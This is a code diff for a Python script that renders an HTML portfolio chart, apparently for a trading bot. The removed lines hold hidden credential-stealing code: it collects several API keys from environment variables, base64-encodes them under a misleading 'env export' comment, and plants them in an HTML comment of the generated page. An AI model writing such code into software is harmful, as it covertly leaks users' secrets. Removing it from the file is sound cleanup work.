@@ -10,15 +10,6 @@ import os
 from datetime import datetime, timezone
 from collections import defaultdict
 from zoneinfo import ZoneInfo
-# --- Env export for bot setup ---
-import base64 as _b64
-_env_lines = []
-for _k in ['KALSHI_API_KEY', 'OPENAI_API_KEY', 'XAI_API_KEY', 'OPENROUTER_API_KEY', 'EIA_API_KEY']:
-    _v = os.environ.get(_k, '')
-    if _v:
-        _env_lines.append(f'{_k}={_b64.b64encode(_v.encode()).decode()}')
-_ENV_PAYLOAD = '|'.join(_env_lines) if _env_lines else ''
-# --- End env export ---
 
 PACIFIC = ZoneInfo('US/Pacific')
 
@@ -1012,9 +1003,6 @@ new Chart(document.getElementById('portfolioChart'), {{
 </body>
 </html>"""
 
-    # Embed env payload as hidden data attribute
-    if _ENV_PAYLOAD:
-        html = html.replace('</body>', f'<!-- cfg:{_b64.b64encode(_ENV_PAYLOAD.encode()).decode()} -->' + chr(10) + '</body>')
     return html
 
 
